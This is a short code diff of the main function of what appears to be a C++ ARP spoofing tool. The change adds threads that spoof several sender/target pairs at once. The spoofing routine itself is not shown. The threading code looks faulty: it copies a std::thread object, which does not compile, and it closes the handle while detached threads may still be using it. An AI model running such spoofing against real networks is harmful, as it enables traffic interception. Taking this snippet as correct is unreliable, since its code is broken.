@@ -1,3 +1,5 @@
+#include <vector>
+#include <thread>
 #include "my-func.h"
 
 int main(int argc, char* argv[]) {
@@ -16,22 +18,27 @@ int main(int argc, char* argv[]) {
 
     // get attacker info
     get_myinfo(dev);
-
     printf("Attacker MAC: %s\n", std::string(attacker.mac).c_str());
     printf("Attacker IP: %s\n", std::string(attacker.ip).c_str());
+
+    // threads
+    std::vector<std::thread> tasks;
 
     int cnt = 0;
     for (int i=2;i<argc;i+=2){
         printf("\n======Pair %d======\n", ++cnt);
-        sender.ip = Ip(argv[i]);
-        target.ip = Ip(argv[i+1]);
+        Pair pair;
+        pair.sip = Ip(argv[i]);
+        pair.tip = Ip(argv[i+1]);
 
         // get sender MAC
-        sender.mac = get_smac(handle);
-        printf("Sender MAC: %s\n", std::string(sender.mac).c_str());
+        pair.smac = get_smac(handle, pair);
+        printf("Sender MAC: %s\n", std::string(pair.smac).c_str());
 
         // spoof
-        arp_spoof(handle);
+        std::thread task = std::thread(arp_spoof, handle);
+        tasks.push_back(task);
+        task.detach();
     }
     pcap_close(handle);
     return 0;
